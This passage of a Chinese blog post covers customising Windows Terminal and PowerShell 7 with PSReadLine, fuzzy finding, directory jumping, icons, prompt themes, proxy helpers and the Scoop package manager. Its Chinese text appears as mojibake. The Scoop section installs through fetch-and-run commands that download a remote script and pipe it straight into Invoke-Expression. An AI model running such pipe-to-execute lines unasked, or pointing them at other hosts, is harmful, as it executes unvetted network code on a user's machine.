class="attr">&quot;cursorColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#AEAFAD&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;cursorShape&quot;</span><span class="punctuation">:</span> <span class="string">&quot;filledBox&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;font&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;face&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CaskaydiaCove NF&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="number">10</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;guid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;xxxx-xxxx-xxx-xxx-xxx-xxxx-xxxx&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;hidden&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;historySize&quot;</span><span class="punctuation">:</span> <span class="number">9001</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;icon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;D:\\PowerShell\\7\\assets\\StoreLogo.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;PowerShell&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;padding&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;snapOnInput&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;startingDirectory&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%USERPROFILE%/Desktop&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;suppressApplicationTitle&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;useAcrylic&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="å­—ä½“é…ç½®"><a href="#å­—ä½“é…ç½®" class="headerlink" title="å­—ä½“é…ç½®"></a>å­—ä½“é…ç½®</h3><blockquote>
<p>  å­—ä½“ä¸‹è½½ï¼š<a href="https://www.nerdfonts.com/font-downloads">https://www.nerdfonts.com/font-downloads</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Caskaydia Cove Nerd Font</span><br><span class="line">Hack Nerd Font</span><br></pre></td></tr></table></figure>



<h2 id="PowerShell-é…ç½®"><a href="#PowerShell-é…ç½®" class="headerlink" title="PowerShell é…ç½®"></a>PowerShell é…ç½®</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç¼–è¾‘ profile æ–‡ä»¶</span><br><span class="line">code $PROFILE</span><br></pre></td></tr></table></figure>

<h3 id="PSFzf"><a href="#PSFzf" class="headerlink" title="PSFzf"></a>PSFzf</h3><blockquote>
<p>  ç»ˆç«¯ä¸‹çš„æ–‡ä»¶æŸ¥æ‰¾å·¥å…·</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Install-Module</span> <span class="literal">-Name</span> PSReadLine  <span class="literal">-Scope</span> CurrentUser</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># PSFzf</span></span><br><span class="line"><span class="built_in">Import-Module</span> <span class="literal">-Name</span> PSFzf</span><br><span class="line"><span class="built_in">Set-PSFzfOption</span> <span class="literal">-PSReadlineChordProvider</span> <span class="string">&#x27;Ctrl+f&#x27;</span> <span class="literal">-PSReadlineChordReverseHistory</span> <span class="string">&#x27;Ctrl+r&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="PSReadLine"><a href="#PSReadLine" class="headerlink" title="PSReadLine"></a>PSReadLine</h3><blockquote>
<p>  å†å²å‘½ä»¤æç¤º</p>
  <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Install-Module</span> <span class="literal">-Name</span> PSReadLine  <span class="literal">-Scope</span> CurrentUser</span><br></pre></td></tr></table></figure>

<p>  PSï¼šå¦‚æœpowershellçš„ç‰ˆæœ¬å¤§äºç­‰äº6ï¼Œå°†è‡ªåŠ¨åŒ…å«æœ€æ–°çš„PSReadLineï¼Œä¸éœ€è¦å†å•ç‹¬å®‰è£…</p>
  <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$PSVersionTable</span> <span class="comment"># æŸ¥çœ‹powershellç‰ˆæœ¬</span></span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Import-Module</span></span><br><span class="line"><span class="built_in">Import-Module</span> PSReadLine</span><br><span class="line"><span class="comment"># # PSReadLine Option</span></span><br><span class="line"><span class="comment"># Set-PSReadLineOption -EditMode Emacs</span></span><br><span class="line"><span class="comment"># Set-PSReadLineOption -BellStyle None</span></span><br><span class="line"><span class="built_in">Set-PSReadLineOption</span> <span class="literal">-PredictionSource</span> <span class="built_in">History</span></span><br><span class="line"><span class="comment"># Set-PSReadLineOption -PredictionViewStyle ListView</span></span><br><span class="line"><span class="built_in">Set-PSReadLineKeyHandler</span> <span class="literal">-Chord</span> <span class="string">&#x27;Ctrl+d&#x27;</span> <span class="literal">-Function</span> DeleteChar </span><br><span class="line"><span class="comment"># è®¾ç½®å‘ä¸Šé”®ä¸ºåå‘æœç´¢å†å²è®°å½•</span></span><br><span class="line"><span class="built_in">Set-PSReadLineKeyHandler</span> <span class="literal">-Key</span> UpArrow <span class="literal">-Function</span> HistorySearchBackward</span><br><span class="line"><span class="comment"># è®¾ç½®å‘ä¸‹é”®ä¸ºå‰å‘æœç´¢å†å²çºªå½•</span></span><br><span class="line"><span class="built_in">Set-PSReadLineKeyHandler</span> <span class="literal">-Key</span> DownArrow <span class="literal">-Function</span> HistorySearchForward</span><br><span class="line"><span class="comment"># è®¾ç½® Tab é”®è¡¥å…¨</span></span><br><span class="line"><span class="comment"># Set-PSReadlineKeyHandler -Key Tab -Function Complete</span></span><br><span class="line"><span class="comment"># # è®¾ç½® Ctrl+d ä¸ºé€€å‡º PowerShell</span></span><br><span class="line"><span class="comment"># # Set-PSReadlineKeyHandler -Key &quot;Ctrl+d&quot; -Function ViExit</span></span><br><span class="line"><span class="comment"># # è®¾ç½® Ctrl+z ä¸ºæ’¤é”€</span></span><br><span class="line"><span class="comment"># Set-PSReadLineKeyHandler -Key &quot;Ctrl+z&quot; -Function Undo</span></span><br><span class="line"><span class="comment"># # è®¾ç½®å‘ä¸Šé”®ä¸ºåå‘æœç´¢å†å²è®°å½•</span></span><br><span class="line"><span class="comment"># Set-PSReadLineKeyHandler -Key UpArrow -Function HistorySearchBackward</span></span><br><span class="line"><span class="comment"># # è®¾ç½®å‘ä¸‹é”®ä¸ºå‰å‘æœç´¢å†å²çºªå½•</span></span><br><span class="line"><span class="comment"># Set-PSReadLineKeyHandler -Key DownArrow -Function HistorySearchForward</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-PSReadLineOption</span> <span class="literal">-Colors</span> <span class="selector-tag">@</span>&#123;</span><br><span class="line">    Command             = <span class="string">&quot;#e5c07b&quot;</span></span><br><span class="line">    Number              = <span class="string">&quot;#cdd4d4&quot;</span></span><br><span class="line">    Member              = <span class="string">&quot;#e06c75&quot;</span></span><br><span class="line">    Operator            = <span class="string">&quot;#e06c75&quot;</span></span><br><span class="line">    <span class="built_in">Type</span>                = <span class="string">&quot;#78b6e9&quot;</span></span><br><span class="line">    Variable            = <span class="string">&quot;#78b6e9&quot;</span></span><br><span class="line">    <span class="keyword">Parameter</span>           = <span class="string">&quot;#e06c75&quot;</span></span><br><span class="line">    ContinuationPrompt  = <span class="string">&quot;#e06c75&quot;</span></span><br><span class="line">    Default             = <span class="string">&quot;#cdd4d4&quot;</span></span><br><span class="line">    Emphasis            = <span class="string">&quot;#e06c75&quot;</span></span><br><span class="line">    Selection           = <span class="string">&quot;#cdd4d4&quot;</span></span><br><span class="line">    Comment             = <span class="string">&quot;#cdd4d4&quot;</span></span><br><span class="line">    Keyword             = <span class="string">&quot;#e06c75&quot;</span></span><br><span class="line">    String              = <span class="string">&quot;#78b6e9&quot;</span></span><br><span class="line">    InlinePrediction    = <span class="string">&quot;#9f9193&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>zsh-Autosuggestioné™¤äº†å¯ä»¥ä½¿ç”¨<code>â†’</code>é”®è¡¥å…¨å…¨éƒ¨å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨<code>ctrl + â†’</code>é€‰æ‹©ä¸‹ä¸€ä¸ªå•è¯ã€‚</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># powershell-PSReadLineå®ç°æ–¹å¼</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-PSReadLineKeyHandler</span> <span class="literal">-Chord</span> <span class="string">&quot;Ctrl+RightArrow&quot;</span> <span class="literal">-Function</span> ForwardWord</span><br></pre></td></tr></table></figure>

<h3 id="ZLocation-ç›®å½•è·³è½¬"><a href="#ZLocation-ç›®å½•è·³è½¬" class="headerlink" title="ZLocation - ç›®å½•è·³è½¬"></a>ZLocation - ç›®å½•è·³è½¬</h3><blockquote>
<p>  <a href="https://github.com/vors/ZLocation">https://github.com/vors/ZLocation</a></p>
<p>  ç±»ä¼¼äºlinuxä¸‹çš„autojump</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Install-Module</span> ZLocation <span class="literal">-Scope</span> CurrentUser</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> <span class="literal">-Name</span> z</span><br></pre></td></tr></table></figure>

<p>usageï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">z &lt;dir_name&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Terminal-Icons"><a href="#Terminal-Icons" class="headerlink" title="Terminal-Icons"></a>Terminal-Icons</h3><blockquote>
<p>  <a href="https://github.com/devblackops/Terminal-Icons">https://github.com/devblackops/Terminal-Icons</a></p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Install-Module</span> <span class="literal">-Name</span> Terminal<span class="literal">-Icons</span> <span class="literal">-Repository</span> PSGallery</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> <span class="literal">-Name</span> Terminal<span class="literal">-Icons</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/2022/02/202202071644240410.png" alt="image-20220207211444500"></p>
<h3 id="å‘½ä»¤è¡Œæµé‡ä»£ç†"><a href="#å‘½ä»¤è¡Œæµé‡ä»£ç†" class="headerlink" title="å‘½ä»¤è¡Œæµé‡ä»£ç†"></a>å‘½ä»¤è¡Œæµé‡ä»£ç†</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SetProxy</span></span> &#123;</span><br><span class="line">	<span class="built_in">Set-Item</span> Env:all_proxy <span class="string">&quot;socks5://127.0.0.1:10808&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SetClashProxy</span></span> &#123;</span><br><span class="line">	<span class="built_in">Set-Item</span> Env:all_proxy <span class="string">&quot;socks5://127.0.0.1:7890&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SetBurpProxy</span></span> &#123;</span><br><span class="line">	<span class="built_in">Set-Item</span> Env:http_proxy <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">	<span class="built_in">Set-Item</span> Env:https_proxy <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">UnSetBurpProxy</span></span> &#123;</span><br><span class="line">	<span class="built_in">Remove-Item</span> Env:http_proxy</span><br><span class="line">	<span class="built_in">Remove-Item</span> Env:https_proxy</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">UnSetProxy</span></span> &#123;</span><br><span class="line">    <span class="built_in">Remove-Item</span> Env:all_proxy</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="è‡ªå®šä¹‰æç¤ºç¬¦"><a href="#è‡ªå®šä¹‰æç¤ºç¬¦" class="headerlink" title="è‡ªå®šä¹‰æç¤ºç¬¦"></a>è‡ªå®šä¹‰æç¤ºç¬¦</h3><h4 id="starship"><a href="#starship" class="headerlink" title="starship"></a>starship</h4><blockquote>
<p>  starship å®‰è£…</p>
<p>  <code>scoop install starship</code></p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># # -----------starship----------</span></span><br><span class="line"><span class="built_in">Invoke-Expression</span> (&amp;starship init powershell)</span><br></pre></td></tr></table></figure>

<h4 id="pshazz"><a href="#pshazz" class="headerlink" title="pshazz"></a>pshazz</h4><blockquote>
<p>  pshazz å®‰è£…</p>
<p>  <code>scoop install pshazz</code></p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ---------pshazz----------</span></span><br><span class="line"><span class="keyword">try</span> &#123; <span class="variable">$null</span> = <span class="built_in">gcm</span> pshazz <span class="literal">-ea</span> stop; pshazz init <span class="string">&#x27;default&#x27;</span> &#125; <span class="keyword">catch</span> &#123; &#125;</span><br></pre></td></tr></table></figure>

<h4 id="oh-my-posh3"><a href="#oh-my-posh3" class="headerlink" title="oh-my-posh3"></a>oh-my-posh3</h4><blockquote>
<p>  oh-my-posh3 é…ç½®</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å®‰è£… posh-git </span></span><br><span class="line"><span class="built_in">Install-Module</span> posh<span class="literal">-git</span>  <span class="literal">-Scope</span> CurrentUser</span><br><span class="line"><span class="comment"># å®‰è£… oh-my-posh</span></span><br><span class="line"><span class="built_in">Install-Module</span> <span class="built_in">oh</span><span class="literal">-my-posh</span> <span class="literal">-Scope</span> CurrentUser</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># scoopå®‰è£…æ–¹å¼</span></span><br><span class="line">scoop install <span class="built_in">oh</span><span class="literal">-my-posh3</span></span><br></pre></td></tr></table></figure>



<h4 id="è‡ªå®šä¹‰"><a href="#è‡ªå®šä¹‰" class="headerlink" title="è‡ªå®šä¹‰"></a>è‡ªå®šä¹‰</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ----------command----------- </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prompt</span></span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">#Write-Host(&quot;$pwd&gt;&quot;)</span></span><br><span class="line">    <span class="comment"># &quot;syyu@win &quot; + &quot;$pwd ~ `n $ &quot;</span></span><br><span class="line">    <span class="string">&quot; syyu@win &quot;</span> + <span class="string">&quot;<span class="variable">$pwd</span> `n <span class="variable">$</span> &quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="winfetch"><a href="#winfetch" class="headerlink" title="winfetch"></a>winfetch</h3><blockquote>
<p>  ä¸€æ¬¾èŠ±é‡Œèƒ¡å“¨çš„åŸºæœ¬ä¿¡æ¯æŸ¥çœ‹å·¥å…·ï¼Œç±»ä¼¼çš„æœ‰ neofetchï¼Œscreenfetch</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scoop install winfetch</span><br></pre></td></tr></table></figure>

<h2 id="Scoop"><a href="#Scoop" class="headerlink" title="Scoop"></a>Scoop</h2><h3 id="scoopå®‰è£…"><a href="#scoopå®‰è£…" class="headerlink" title="scoopå®‰è£…"></a>scoopå®‰è£…</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> System.Net.WebClient).DownloadString(<span class="string">&#x27;https://get.scoop.sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># or shorter</span></span><br><span class="line"><span class="built_in">iwr</span> <span class="literal">-useb</span> get.scoop.sh | <span class="built_in">iex</span></span><br></pre></td></tr></table></figure>

<p>Note: if you get an error you might need to change the execution policy (i.e. enable Powershell) with</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> RemoteSigned <span class="literal">-scope</span> CurrentUser</span><br></pre></td></tr></table></figure>

<h3 id="scoop-Usage"><a href="#scoop-Usage" class="headerlink" title="scoop Usage"></a>scoop Usage</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Usage: scoop &lt;command&gt; [&lt;args&gt;]</span><br><span class="line"></span><br><span class="line">Some useful commands are:</span><br><span class="line"></span><br><span class="line">alias       Manage scoop aliases</span><br><span class="line">bucket      Manage Scoop buckets</span><br><span class="line">cache       Show or clear the download cache</span><br><span class="line">cat         Show content of specified manifest.</span><br><span class="line">checkup     Check for potential problems</span><br><span class="line">cleanup     Cleanup apps by removing old versions</span><br><span class="line">config      Get or set configuration values</span><br><span class="line">create      Create a custom app manifest</span><br><span class="line">depends     List dependencies for an app</span><br><span class="line">export      Exports (an importable) list of installed apps</span><br><span class="line">help        Show help for a command</span><br><span class="line">hold        Hold an app to disable updates</span><br><span class="line">home        Opens the app homepage</span><br><span class="line">info        Display information about an app</span><br><span class="line">install     Install apps</span><br><span class="line">list        List installed apps</span><br><span class="line">prefix      Returns the path to the specified app</span><br><span class="line">reset       Reset an app to resolve conflicts</span><br><span class="line">search      Search available apps</span><br><span class="line">status      Show status and check for new app versions</span><br><span class="line">unhold      Unhold an app to enable updates</span><br><span class="line">uninstall   Uninstall an app</span><br><span class="line">update      Update apps, or Scoop itself</span><br><span class="line">virustotal  Look for app&#x27;s hash on virustotal.com</span><br><span class="line">which       Locate a shim/executable (similar to &#x27;which&#x27; on Linux)</span><br><span class="line"></span><br><span class="line">Type &#x27;scoop help &lt;command&gt;&#x27; to get help for a specific command.</span><br></pre></td></tr></table></figure>



<h3 id="scoopé…ç½®æŒ‡å—"><a href="#scoopé…ç½®æŒ‡å—" class="headerlink" title="scoopé…ç½®æŒ‡å—"></a>scoopé…ç½®æŒ‡å—</h3><p>è§å¦ä¸€ç¯‡åšå®¢ </p>
<p>#TODO</p>
<h2 id="å¸¸ç”¨å¿«æ·é”®"><a href="#å¸¸ç”¨å¿«æ·é”®" class="headerlink" title="å¸¸ç”¨å¿«æ·é”®"></a>å¸¸ç”¨å¿«æ·é”®</h2><ul>
<li><strong>win + åå¼•å·ï¼ˆ&#96;ï¼‰</strong></li>
</ul>
<blockquote>
<p>  æ‰“å¼€Quakeæ¨¡å¼</p>
</blockquote>
<ul>
<li>é…ç½®ä¸“æ³¨æ¨¡å¼ï¼ˆeg: <strong>Alt + P</strong>)</li>
</ul>
<blockquote>
<p>  æ˜¾ç¤º&#x2F;éšè—æ ‡é¢˜æ ï¼Œåœ¨Quakeæ¨¡å¼ï¼ˆwin + åå¼•å·ï¼‰ä¹Ÿå¯è§¦å‘</p>
</blockquote>
<ul>
<li>åˆ†å±æ“ä½œ</li>
</ul>
<blockquote>
<p>  <a href="https://docs.microsoft.com/zh-cn/windows/terminal/panes">https://docs.microsoft.com/zh-cn/windows/terminal/panes</a></p>
<p>  Alt + Shift + (+)  æ°´å¹³çª—æ ¼</p>
<p>  Alt + Shift + (-)  å‚ç›´çª—æ ¼</p>
<p>  â€¦</p>
</blockquote>
<p>and so on â€¦</p>
<p>#TODO</p>
<h2 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h2><h3 id="Windows-Terminal"><a href="#Windows-Terminal" class="headerlink" title="Windows Terminal"></a>Windows Terminal</h3><blockquote>
<p>   C:\Users\%USERNAME%\AppData\Local\Packages\Microsoft.WindowsTerminal_xxxxxxxxxxxxx\LocalState\settings.json</p>
</blockquote>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure>

<p>#TODO</p>
<h3 id="PowerShell-7"><a href="#PowerShell-7" class="headerlink" title="PowerShell 7"></a>PowerShell 7</h3><blockquote>
<p>  C:\Users\%USERNAME%\Documents\PowerShell\Microsoft.PowerShell_profile.ps1</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SetProxy</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SetProxy</span></span> &#123;</span><br><span class="line">	<span class="built_in">Set-Item</span> Env:all_proxy <span class="string">&quot;socks5://127.0.0.1:10808&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SetClashProxy</span></span> &#123;</span><br><span class="line">	<span class="built_in">Set-Item</span> Env:all_proxy <span class="string">&quot;socks5://127.0.0.1:7890&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SetBurpProxy</span></span> &#123;</span><br><span class="line">	<span class="built_in">Set-Item</span> Env:http_proxy <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">	<span class="built_in">Set-Item</span> Env:https_proxy <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">UnSetBurpProxy</span></span> &#123;</span><br><span class="line">	<span class="built_in">Remove-Item</span> Env:http_proxy</span><br><span class="line">	<span class="built_in">Remove-Item</span> Env:https_proxy</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">UnSetProxy</span></span> &#123;</span><br><span class="line">    <span class="built_in">Remove-Item</span> Env:all_proxy</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Import-Module</span></span><br><span class="line"><span class="built_in">Import-Module</span> PSReadLine</span><br><span class="line"><span class="built_in">Import-Module</span> <span class="literal">-Name</span> Terminal<span class="literal">-Icons</span></span><br><span class="line"><span class="built_in">Import-Module</span> <span class="literal">-Name</span> z</span><br><span class="line"><span class="comment"># Import-Module -Name PSFzf</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-PSReadLineOption</span> <span class="literal">-PredictionSource</span> <span class="built_in">History</span></span><br><span class="line"><span class="comment"># Set-PSReadLineOption -PredictionViewStyle ListView</span></span><br><span class="line"><span class="built_in">Set-PSReadLineKeyHandler</span> <span class="literal">-Chord</span> <span class="string">&#x27;Ctrl+d&#x27;</span> <span class="literal">-Function</span> DeleteChar </span><br><span class="line"><span class="comment"># è®¾ç½®å‘ä¸Šé”®ä¸ºåå‘æœç´¢å†å²è®°å½•</span></span><br><span class="line"><span class="built_in">Set-PSReadLineKeyHandler</span> <span class="literal">-Key</span> UpArrow <span class="literal">-Function</span> HistorySearchBackward</span><br><span class="line"><span class="comment"># è®¾ç½®å‘ä¸‹é”®ä¸ºå‰å‘æœç´¢å†å²çºªå½•</span></span><br><span class="line"><span class="built_in">Set-PSReadLineKeyHandler</span> <span class="literal">-Key</span> DownArrow <span class="literal">-Function</span> HistorySearchForward</span><br><span class="line"><span class="comment"># è®¾ç½®ctrl + å³é”®ï¼Œé€å­—è¡¥å…¨</span></span><br><span class="line"><span class="built_in">Set-PSReadLineKeyHandler</span> <span class="literal">-Chord</span> <span class="string">&quot;Ctrl+RightArrow&quot;</span> <span class="literal">-Function</span> ForwardWord</span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-PSReadLineOption</span> <span class="literal">-Colors</span> <span class="selector-tag">@</span>&#123;</span><br><span class="line">    Command             = <span class="string">&quot;#e5c07b&quot;</span></span><br><span class="line">    Number              = <span class="string">&quot;#cdd4d4&quot;</span></span><br><span class="line">    Member              = <span class="string">&quot;#e06c75&quot;</span></span><br><span class="line">    Operator            = <span class="string">&quot;#e06c75&quot;</span></span><br><span class="line">    <span class="built_in">Type</span>                = <span class="string">&quot;#78b6e9&quot;</span></span><br><span class="line">    Variable            = <span class="string">&quot;#78b6e9&quot;</span></span><br><span class="line">    <span class="keyword">Parameter</span>           = <span class="string">&quot;#e06c75&quot;</span></span><br><span class="line">    ContinuationPrompt  = <span class="string">&quot;#e06c75&quot;</span></span><br><span class="line">    Default             = <span class="string">&quot;#cdd4d4&quot;</span></span><br><span class="line">    Emphasis            = <span class="string">&quot;#e06c75&quot;</span></span><br><span class="line">    Selection           = <span class="string">&quot;#cdd4d4&quot;</span></span><br><span class="line">    Comment             = <span class="string">&quot;#cdd4d4&quot;</span></span><br><span class="line">    Keyword             = <span class="string">&quot;#e06c75&quot;</span></span><br><span class="line">    String              = <span class="string">&quot;#78b6e9&quot;</span></span><br><span class="line">    InlinePrediction    = <span class="string">&quot;#9f9193&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># PSFzf</span></span><br><span class="line"><span class="comment"># Set-PSFzfOption -PSReadlineChordProvider &#x27;Ctrl+f&#x27; -PSReadlineChordReverseHistory &#x27;Ctrl+r&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # -----------starship----------</span></span><br><span class="line"><span class="built_in">Invoke-Expression</span> (&amp;starship init powershell)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ----------command----------- </span></span><br><span class="line"><span class="comment"># function prompt</span></span><br><span class="line"><span class="comment"># &#123;</span></span><br><span class="line"><span class="comment">#     #Write-Host(&quot;$pwd&gt;&quot;)</span></span><br><span class="line"><span class="comment">#     # &quot;syyu@win &quot; + &quot;$pwd ~ `n $ &quot;</span></span><br><span class="line"><span class="comment">#     &quot; syyu@win &quot; + &quot;$pwd `n $ &quot;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------pshazz----------</span></span><br><span class="line"><span class="comment"># try &#123; $null = gcm pshazz -ea stop; pshazz init &#x27;default&#x27; &#125; catch &#123; &#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><blockquote>
<p>  C:\Users\%USERNAME%\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1</p>
</blockquote>
<p>å¥½äº†ï¼Œå¤§è‡´çš„é…ç½®å°±ç»“æŸäº†ã€‚</p>
<p>çœ‹ä¸€æ³¢æ•ˆæœå›¾â€¦</p>
<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/2022/02/202202071644240415.png" alt="image-20220207212029891"></p>
<p>è¿˜æœ‰ä¸€äº›é…ç½®å’Œå›¾ç‰‡ï¼Œä¸‹æ¬¡ä¸€å®šï¼Œå…ˆå»ºä¸ª#TODO ï¼Œå“ˆå“ˆå“ˆå“ˆ</p>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://docs.microsoft.com/zh-cn/windows/terminal/">https://docs.microsoft.com/zh-cn/windows/terminal/</a></p>
<p><a href="https://juejin.cn/post/6984620463917891614">https://juejin.cn/post/6984620463917891614</a></p>
<p><a href="https://elfile4138.moe/2021/08/Windows-Terminal%E7%9A%84%E9%85%8D%E7%BD%AE/">https://elfile4138.moe/2021/08/Windows-Terminal%E7%9A%84%E9%85%8D%E7%BD%AE/</a></p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>ç¾åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>Windowsä¸‹å¿«é€Ÿåˆ‡æ¢å…¨æ‹¼/åŒæ‹¼</title>
    <url>/articles/d4db3d41/</url>
